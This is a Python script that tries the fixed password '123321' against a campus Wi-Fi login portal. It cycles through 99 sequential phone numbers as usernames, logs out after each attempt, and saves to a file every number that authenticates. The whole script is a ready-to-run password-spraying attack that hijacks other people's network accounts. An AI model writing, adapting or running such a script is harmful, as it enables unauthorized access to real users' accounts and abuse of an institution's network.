import requests
import base64
import time


def wlan_login(tele_num):
    login_url = "http://a.nuist.edu.cn/index.php/index/login"
    USER_ACCOUNT = str(tele_num)
    DOMAIN_SELECTION = "CMCC"
    USER_PASSWATD = '123321'

    USER_PASSWATD = base64.b64encode(USER_PASSWATD.encode())
    login_form = {"username": USER_ACCOUNT,
                  "domain": DOMAIN_SELECTION,
                  "password": USER_PASSWATD,
                  "enablemacauth": "0"}
    login_status = requests.post(url=login_url, data=login_form).content.decode("unicode-escape")

    return login_status


def wlan_logout():
    logout_url = "http://a.nuist.edu.cn/index.php/index/logout"
    logout_status = requests.post(logout_url)
    return logout_status


if __name__ == '__main__':
    output = open("login.txt", "w+")
    base_tele_num = 18851903109
    for i in range(1, 100):
        tele_num = base_tele_num + i
        status = wlan_login(tele_num)
        print(status)
        if "认证成功" in status:
            print(tele_num, file=output)
            print(tele_num)
        wlan_logout()
